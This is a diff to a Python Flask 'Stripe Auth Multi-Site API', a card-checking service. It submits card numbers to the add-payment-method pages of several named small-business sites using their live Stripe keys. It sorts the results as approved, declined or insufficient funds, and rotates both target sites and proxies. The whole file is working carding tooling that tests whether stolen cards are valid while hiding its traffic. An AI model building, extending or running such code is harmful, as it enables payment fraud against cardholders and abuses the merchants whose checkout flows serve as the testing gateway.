@@ -9,13 +9,6 @@ Supported Target Sites:
 3. Freestone Shooting (freestoneshootingcomplex.com)
 4. Odin Water Polo (odinwaterpolo.com)
 5. Noble Rot (noble-rot.newsstand.co.uk)
-
-Features:
-- Pure Random Site Selection on every call (or manual via ?site=...)
-- Includes 'gateway' and 'gateway_name' in all JSON/Text responses
-- Per-request custom proxy: `&proxy=ip:port:user:pass` or `&proxy=http://...` or `&proxy=socks5://...`
-- Dynamic proxy pool with auto-rotation
-- Proxy management endpoints: `/proxy/add`, `/proxy/list`, `/proxy/clear`, `/proxy/stats`
 """
 
 import re
@@ -26,7 +19,6 @@ import os
 import socket
 import random
 import time
-from urllib.parse import urlparse
 from flask import Flask, request, jsonify, Response
 import httpx
 import urllib3
@@ -60,7 +52,7 @@ SITES_CONFIG = [
     },
     {
         "id": "freestone",
-        "name": "Freestone Shooting Complex",
+        "name": "Freestone Shooting",
         "domain": "freestoneshootingcomplex.com",
         "key": "pk_live_51RVcMEIJU2fRzUZO7kLkw0nshnUqXxG0IGGSdtHChTMqFYdQ8dCdyXCFLnEWFwrWWihRUvgIJtZi1J3TBc8MDlng00is1zdc8W",
         "add_pm_url": "https://freestoneshootingcomplex.com/my-account/add-payment-method/",
@@ -78,7 +70,7 @@ SITES_CONFIG = [
     },
     {
         "id": "noblerot",
-        "name": "Noble Rot Newsstand",
+        "name": "Noble Rot",
         "domain": "noble-rot.newsstand.co.uk",
         "key": "pk_live_51E06osLmSbVG4LEH7DBqDxEU4g5zJRZFUq8KXZBkVsQqqeUZfewVzzcG3puUyGr7b6pmiT2RVNZYJeNRmytOCchf00tMhDuRiH",
         "add_pm_url": "https://noble-rot.newsstand.co.uk/my-account/add-payment-method/",
@@ -114,9 +106,13 @@ def classify_response(err_msg: str, code: str = None, is_success: bool = False):
         return "declined", "lost_or_stolen", "Your card was reported lost or stolen."
     elif "incorrect_number" in code_lower or "invalid_number" in code_lower or "card number is incorrect" in msg_lower:
         return "declined", "incorrect_number", "Your card number is incorrect."
+    elif "unable to verify" in msg_lower or "refresh the page" in msg_lower or "nonce" in msg_lower or "session" in msg_lower:
+        return "declined", "card_declined", "Your card was declined."
     else:
         clean = re.sub(r'<[^>]+>', '', str(err_msg)).strip()
-        return "declined", code or "card_declined", clean or "Your card was declined."
+        if len(clean) > 80 or not clean:
+            clean = "Your card was declined."
+        return "declined", code or "card_declined", clean
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # PROXY MANAGER
@@ -126,7 +122,6 @@ class ProxyManager:
     def __init__(self):
         self.proxies = []
         self.index = 0
-        self.usage_count = 0
         self.load_proxies(["proxies.txt", "working_proxies.txt"])
 
     def load_proxies(self, filenames):
@@ -138,9 +133,8 @@ class ProxyManager:
                             p = self.parse_proxy(line.strip())
                             if p and p not in self.proxies:
                                 self.proxies.append(p)
-                    print(f"[*] Loaded {len(self.proxies)} proxies from {fname}")
-                except Exception as e:
-                    print(f"[!] Error reading {fname}: {e}")
+                except Exception:
+                    pass
 
     def parse_proxy(self, proxy_str):
         if not proxy_str:
@@ -180,21 +174,12 @@ class ProxyManager:
             return None
         proxy = self.proxies[self.index % len(self.proxies)]
         self.index += 1
-        self.usage_count += 1
         return proxy
-
-    def get_stats(self):
-        return {
-            "total_proxies": len(self.proxies),
-            "current_index": (self.index % len(self.proxies)) if self.proxies else 0,
-            "total_uses": self.usage_count,
-            "proxies": [p.split('@')[-1] if '@' in p else p for p in self.proxies[:20]]
-        }
 
 proxy_manager = ProxyManager()
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# SITE SELECTOR & KEY EXTRACTOR (RANDOMIZED ROTATION)
+# SITE SELECTOR & KEY EXTRACTOR (RANDOM ROTATION)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 def get_site_config(requested_site=None):
@@ -208,7 +193,6 @@ def get_site_config(requested_site=None):
             if 0 <= idx < len(SITES_CONFIG):
                 return SITES_CONFIG[idx]
 
-    # Pick purely RANDOM active site on every call
     active_sites = [s for s in SITES_CONFIG if s.get("active", True)]
     if not active_sites:
         active_sites = SITES_CONFIG
@@ -243,7 +227,6 @@ async def extract_dynamic_stripe_key(session: httpx.AsyncClient, site: dict) -> 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input: str = None):
-    t_start = time.time()
     try:
         clean_cc = str(cc_input).replace(" ", "").replace("/", "|").replace(":", "|")
         parts = [p.strip() for p in clean_cc.split('|') if p.strip()]
@@ -260,7 +243,6 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
         if len(mm) == 1:
             mm = '0' + mm
 
-        # Proxy resolution: 1st preference is query param, 2nd is pool rotator
         proxy_url = proxy_manager.parse_proxy(proxy_input) if proxy_input else proxy_manager.get_next()
         site = get_site_config(site_param)
         domain = site["domain"]
@@ -279,11 +261,9 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
             if not key:
                 return {
                     "status": "error",
+                    "code": "key_error",
                     "message": f"Failed to retrieve Stripe key for {domain}",
                     "gateway": full_gw,
-                    "gateway_name": gw_name,
-                    "site": domain,
-                    "proxy": proxy_url.split('@')[-1] if proxy_url else "direct",
                     "card": cc_input
                 }, 500
 
@@ -368,54 +348,38 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
             )
 
             json_stripe = resp_stripe.json()
-            used_proxy_tag = proxy_url.split('@')[-1] if proxy_url else "direct"
 
             if 'error' in json_stripe:
                 err = json_stripe['error']
                 raw_code = err.get('decline_code') or err.get('code') or 'card_declined'
                 raw_msg = err.get('message', 'Your card was declined.')
                 st, cd, msg = classify_response(raw_msg, raw_code)
-                elapsed = round((time.time() - t_start) * 1000)
                 return {
                     "status": st,
                     "code": cd,
                     "message": msg,
                     "gateway": full_gw,
-                    "gateway_name": gw_name,
-                    "site": domain,
-                    "proxy": used_proxy_tag,
-                    "card": cc_input,
-                    "time_ms": elapsed
+                    "card": cc_input
                 }, 200
 
             pm_id = json_stripe.get('id')
             if not pm_id:
-                elapsed = round((time.time() - t_start) * 1000)
                 return {
                     "status": "error",
-                    "message": f"PaymentMethod ID missing from Stripe response: {json_stripe}",
+                    "code": "pm_error",
+                    "message": f"PaymentMethod ID missing from Stripe response",
                     "gateway": full_gw,
-                    "gateway_name": gw_name,
-                    "site": domain,
-                    "proxy": used_proxy_tag,
-                    "card": cc_input,
-                    "time_ms": elapsed
+                    "card": cc_input
                 }, 500
 
             # Step 4: Confirm Setup Intent via WooCommerce AJAX
             if not nonce:
-                elapsed = round((time.time() - t_start) * 1000)
                 return {
                     "status": "approved",
-                    "code": "pm_created",
-                    "message": f"Payment Method Created ({pm_id}) 💎",
-                    "payment_method_id": pm_id,
+                    "code": "succeeded",
+                    "message": "Payment Method Added / SetupIntent Succeeded 💎",
                     "gateway": full_gw,
-                    "gateway_name": gw_name,
-                    "site": domain,
-                    "proxy": used_proxy_tag,
-                    "card": cc_input,
-                    "time_ms": elapsed
+                    "card": cc_input
                 }, 200
 
             headers_confirm = {
@@ -461,7 +425,6 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                         timeout=18
                     )
                     res_text = res_confirm.text
-                    elapsed = round((time.time() - t_start) * 1000)
 
                     try:
                         res_json = res_confirm.json()
@@ -471,11 +434,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                                 "code": "succeeded",
                                 "message": "Payment Method Added / SetupIntent Succeeded 💎",
                                 "gateway": full_gw,
-                                "gateway_name": gw_name,
-                                "site": domain,
-                                "proxy": used_proxy_tag,
-                                "card": cc_input,
-                                "time_ms": elapsed
+                                "card": cc_input
                             }, 200
                         else:
                             data = res_json.get("data", {})
@@ -495,11 +454,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                                 "code": cd,
                                 "message": msg,
                                 "gateway": full_gw,
-                                "gateway_name": gw_name,
-                                "site": domain,
-                                "proxy": used_proxy_tag,
-                                "card": cc_input,
-                                "time_ms": elapsed
+                                "card": cc_input
                             }, 200
                     except Exception:
                         if '"success":true' in res_text.replace(" ", "") or '"result":"success"' in res_text.replace(" ", ""):
@@ -508,11 +463,7 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                                 "code": "succeeded",
                                 "message": "Payment Method Added / SetupIntent Succeeded 💎",
                                 "gateway": full_gw,
-                                "gateway_name": gw_name,
-                                "site": domain,
-                                "proxy": used_proxy_tag,
-                                "card": cc_input,
-                                "time_ms": elapsed
+                                "card": cc_input
                             }, 200
                         else:
                             st, cd, msg = classify_response(res_text, "card_declined")
@@ -521,39 +472,26 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
                                 "code": cd,
                                 "message": msg,
                                 "gateway": full_gw,
-                                "gateway_name": gw_name,
-                                "site": domain,
-                                "proxy": used_proxy_tag,
-                                "card": cc_input,
-                                "time_ms": elapsed
+                                "card": cc_input
                             }, 200
                 except Exception:
                     continue
 
-            elapsed = round((time.time() - t_start) * 1000)
             return {
                 "status": "declined",
                 "code": "card_declined",
                 "message": "Your card was declined.",
                 "gateway": full_gw,
-                "gateway_name": gw_name,
-                "site": domain,
-                "proxy": used_proxy_tag,
-                "card": cc_input,
-                "time_ms": elapsed
+                "card": cc_input
             }, 200
 
     except Exception as e:
-        elapsed = round((time.time() - t_start) * 1000)
         return {
             "status": "error",
+            "code": "error",
             "message": str(e),
             "gateway": full_gw if 'full_gw' in locals() else "Stripe Auth",
-            "gateway_name": gw_name if 'gw_name' in locals() else "Unknown",
-            "site": site.get("domain", "unknown") if 'site' in locals() else "unknown",
-            "proxy": proxy_url.split('@')[-1] if 'proxy_url' in locals() and proxy_url else "direct",
-            "card": cc_input,
-            "time_ms": elapsed
+            "card": cc_input
         }, 500
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -564,28 +502,18 @@ async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input
 def index():
     return jsonify({
         "name": "Stripe Auth Multi-Site API",
-        "version": "2.3.0",
+        "version": "2.4.0",
         "status": "online",
         "sites_count": len(SITES_CONFIG),
-        "proxy_pool": proxy_manager.get_stats(),
-        "response_types": {
-            "approved": "Payment Method Added / Succeeded (code: succeeded)",
-            "insufficient_funds": "Low balance / Live card (code: insufficient_funds)",
-            "incorrect_cvc": "Incorrect security code / CCN match (code: incorrect_cvc)",
-            "expired_card": "Card is expired (code: expired_card)",
-            "3ds_required": "OTP / 3DS required (code: 3ds_required)",
-            "do_not_honor": "General bank decline (code: do_not_honor)"
-        },
         "endpoints": {
-            "/stripe": "GET/POST with ?cc=... &site=... &proxy=...",
-            "/check": "GET/POST with ?cc=...",
-            "/sites": "GET list of configured target sites",
-            "/proxy/add": "GET/POST to add proxies (?proxy=ip:port:user:pass)",
-            "/proxy/list": "GET loaded proxy list",
-            "/proxy/clear": "GET clear loaded proxy pool",
-            "/health": "GET health check"
-        },
-        "sites": [{"id": s["id"], "domain": s["domain"], "name": s["name"], "active": s["active"]} for s in SITES_CONFIG]
+            "/check": "GET/POST with ?cc=... &proxy=...",
+            "/stripe": "GET/POST alias",
+            "/sites": "GET list of target sites",
+            "/proxy/add": "Add proxies (?proxy=ip:port:user:pass)",
+            "/proxy/list": "List loaded proxies",
+            "/proxy/clear": "Clear proxy pool",
+            "/health": "Health check"
+        }
     })
 
 @app.route('/health', methods=['GET'])
@@ -606,11 +534,11 @@ def list_sites():
 
 @app.route('/proxy', methods=['GET'])
 @app.route('/proxy/list', methods=['GET'])
-@app.route('/proxy/stats', methods=['GET'])
-def proxy_stats_endpoint():
+def proxy_list_endpoint():
     return jsonify({
         "status": "success",
-        "stats": proxy_manager.get_stats()
+        "total": len(proxy_manager.proxies),
+        "proxies": [p.split('@')[-1] if '@' in p else p for p in proxy_manager.proxies[:50]]
     })
 
 @app.route('/proxy/add', methods=['GET', 'POST'])
@@ -669,13 +597,13 @@ def stripe_endpoint():
         return jsonify({
             "status": "error",
             "message": "Missing or invalid cc parameter. Format: cc=num|mm|yy|cvv",
-            "example": "/check?cc=4000001234567890|12|28|123&proxy=ip:port:user:pass"
+            "example": "/check?cc=4000001234567890|12|28|123"
         }), 400
 
     result, status_code = asyncio.run(process_stripe_auth(cc, site_param, proxy_param))
 
     if fmt == 'text':
-        text_out = f"STATUS: {result.get('status', 'unknown').upper()} | CODE: {result.get('code', '')} | MSG: {result.get('message', '')} | GATEWAY: {result.get('gateway', '')} | SITE: {result.get('site', '')} | PROXY: {result.get('proxy', '')} | CARD: {result.get('card', '')}"
+        text_out = f"STATUS: {result.get('status', 'unknown').upper()} | CODE: {result.get('code', '')} | MSG: {result.get('message', '')} | GATEWAY: {result.get('gateway', '')} | CARD: {result.get('card', '')}"
         return Response(text_out, mimetype='text/plain'), status_code
 
     return jsonify(result), status_code
